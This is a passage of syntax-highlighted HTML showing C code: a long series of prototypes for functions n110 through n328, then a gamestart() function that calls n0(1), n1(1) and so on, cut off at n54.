class="hljs-type">void</span> <span class="hljs-title function_">n110</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n111</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n112</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n113</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n114</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n115</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n116</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n117</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n118</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n119</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n120</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n121</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n122</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n123</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n124</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n125</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n126</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n127</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n128</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n129</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n130</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n131</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n132</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n133</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n134</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n135</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n136</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n137</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n138</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n139</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n140</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n141</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n142</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n143</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n144</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n145</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n146</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n147</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n148</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n149</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n150</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n151</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n152</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n153</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n154</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n155</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n156</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n157</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n158</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n159</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n160</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n161</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n162</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n163</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n164</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n165</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n166</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n167</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n168</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n169</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n170</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n171</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n172</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n173</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n174</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n175</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n176</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n177</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n178</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n179</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n180</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n181</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n182</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n183</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n184</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n185</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n186</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n187</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n188</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n189</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n190</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n191</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n192</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n193</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n194</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n195</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n196</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n197</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n198</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n199</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n200</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n201</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n202</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n203</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n204</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n205</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n206</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n207</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n208</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n209</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n210</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n211</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n212</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n213</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n214</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n215</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n216</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n217</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n218</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n219</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n220</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n221</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n222</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n223</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n224</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n225</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n226</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n227</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n228</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n229</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n230</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n231</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n232</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n233</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n234</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n235</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n236</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n237</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n238</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n239</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n240</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n241</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n242</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n243</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n244</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n245</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n246</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n247</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n248</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n249</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n250</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n251</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n252</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n253</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n254</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n255</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n256</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n257</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n258</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n259</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n260</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n261</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n262</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n263</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n264</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n265</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n266</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n267</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n268</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n269</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n270</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n271</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n272</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n273</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n274</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n275</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n276</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n277</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n278</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n279</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n280</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n281</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n282</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n283</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n284</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n285</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n286</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n287</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n288</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n289</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n290</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n291</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n292</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n293</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n294</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n295</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n296</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n297</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n298</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n299</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n300</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n301</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n302</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n303</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n304</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n305</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n306</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n307</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n308</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n309</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n310</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n311</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n312</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n313</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n314</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n315</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n316</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n317</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n318</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n319</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n320</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n321</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n322</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n323</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n324</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n325</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n326</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n327</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n328</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">gamestart</span><span class="hljs-params">()</span><br>&#123;<br><br>n0(<span class="hljs-number">1</span>);<br>n1(<span class="hljs-number">1</span>);<br>n2(<span class="hljs-number">1</span>);<br>n3(<span class="hljs-number">1</span>);<br>n4(<span class="hljs-number">1</span>);<br>n5(<span class="hljs-number">1</span>);<br>n6(<span class="hljs-number">1</span>);<br>n7(<span class="hljs-number">1</span>);<br>n8(<span class="hljs-number">1</span>);<br>n9(<span class="hljs-number">1</span>);<br>n10(<span class="hljs-number">1</span>);<br>n11(<span class="hljs-number">1</span>);<br>n12(<span class="hljs-number">1</span>);<br>n13(<span class="hljs-number">1</span>);<br>n14(<span class="hljs-number">1</span>);<br>n15(<span class="hljs-number">1</span>);<br>n16(<span class="hljs-number">1</span>);<br>n17(<span class="hljs-number">1</span>);<br>n18(<span class="hljs-number">1</span>);<br>n19(<span class="hljs-number">1</span>);<br>n20(<span class="hljs-number">1</span>);<br>n21(<span class="hljs-number">1</span>);<br>n22(<span class="hljs-number">1</span>);<br>n23(<span class="hljs-number">1</span>);<br>n24(<span class="hljs-number">1</span>);<br>n25(<span class="hljs-number">1</span>);<br>n26(<span class="hljs-number">1</span>);<br>n27(<span class="hljs-number">1</span>);<br>n28(<span class="hljs-number">1</span>);<br>n29(<span class="hljs-number">1</span>);<br>n30(<span class="hljs-number">1</span>);<br>n31(<span class="hljs-number">1</span>);<br>n32(<span class="hljs-number">1</span>);<br>n33(<span class="hljs-number">1</span>);<br>n34(<span class="hljs-number">1</span>);<br>n35(<span class="hljs-number">1</span>);<br>n36(<span class="hljs-number">1</span>);<br>n37(<span class="hljs-number">1</span>);<br>n38(<span class="hljs-number">1</span>);<br>n39(<span class="hljs-number">1</span>);<br>n40(<span class="hljs-number">1</span>);<br>n41(<span class="hljs-number">1</span>);<br>n42(<span class="hljs-number">1</span>);<br>n43(<span class="hljs-number">1</span>);<br>n44(<span class="hljs-number">1</span>);<br>n45(<span class="hljs-number">1</span>);<br>n46(<span class="hljs-number">1</span>);<br>n47(<span class="hljs-number">1</span>);<br>n48(<span class="hljs-number">1</span>);<br>n49(<span class="hljs-number">1</span>);<br>n50(<span class="hljs-number">1</span>);<br>n51(<span class="hljs-number">1</span>);<br>n52(<span class="hljs-number">1</span>);<br>n53(<span class="hljs-number">1</span>);<br>n54(<span 